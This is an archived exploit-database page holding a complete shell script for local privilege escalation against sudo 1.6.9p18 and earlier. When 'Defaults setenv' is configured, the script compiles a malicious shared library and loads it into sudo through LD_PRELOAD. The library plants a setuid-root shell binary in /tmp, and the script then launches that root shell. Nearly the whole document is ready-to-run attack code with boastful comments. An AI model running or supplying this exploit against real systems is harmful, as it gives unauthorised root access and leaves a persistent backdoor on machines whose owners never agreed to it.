<html><head><title>Sudo <= 1.6.9p18 (Defaults setenv) Local Privilege Escalation Exploit</title></head><pre>#!/bin/sh
#* Sudo &lt;= 1.6.9p18 local r00t exploit
#* by Kingcope/2008/www.com-winner.com
#
# Most lame exploit EVER!
#
# Needs a special configuration in the sudoers file:
# ---&gt;&gt;&gt;&gt;&gt; &quot;Defaults setenv&quot; so environ vars are preserved :) &lt;&lt;&lt;&lt;&lt;---
#
# May also need the current users password to be typed in
# So this exploit is UBERLAME!
# First Argument to this shell file: A program your current
# user is allowed to execute via sudo. sudo has to be in 
# the path!!
# successfully tested on FreeBSD-7.0 and RedHat Linux
# I don't even know why I realease such stuffz
# I'M GONNA GRAB A COFFE NOW;HAVE PHUN !!!

echo &quot;Sudo &lt;= 1.6.9p18 local r00t exploit&quot;
echo &quot;by Kingcope/2008/www.com-winner.com&quot;

if [$1 == &quot;&quot;]; then
echo &quot;Please give me a program to run via sudo.&quot;
echo &quot;Allowed programs:&quot;
sudo -l
exit
fi

cat &gt; program.c &lt;&lt; _EOF
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init()
{
 if (!geteuid()) {
 unsetenv(&quot;LD_PRELOAD&quot;);
 setgid(0);
 setuid(0);
 execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-c&quot;,&quot;chown 0:0 /tmp/xxxx; /bin/chmod +xs /tmp/xxxx&quot;,NULL);
 }
}

_EOF

cat &gt; xxxx.c &lt;&lt; _EOF
int main(void) {
       setgid(0); setuid(0);
//       unlink(&quot;/tmp/xxxx&quot;);
       execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0); }
_EOF

gcc -o /tmp/xxxx xxxx.c
gcc -o program.o -c program.c -fPIC
gcc -shared -Wl,-soname,libno_ex.so.1 -o /tmp/libno_ex.so.1.0 program.o -nostartfiles
sudo LD_PRELOAD=/tmp/libno_ex.so.1.0 $1
if [ -f /tmp/xxxx ]; then
echo &quot;CONGRATULATIONS, IT'S A ROOTSHELL!&quot;
/tmp/xxxx
else
echo &quot;Sorry, exploit failed. No envvars allowed?&quot;
fi

# milw0rm.com [2008-11-15]</pre></html>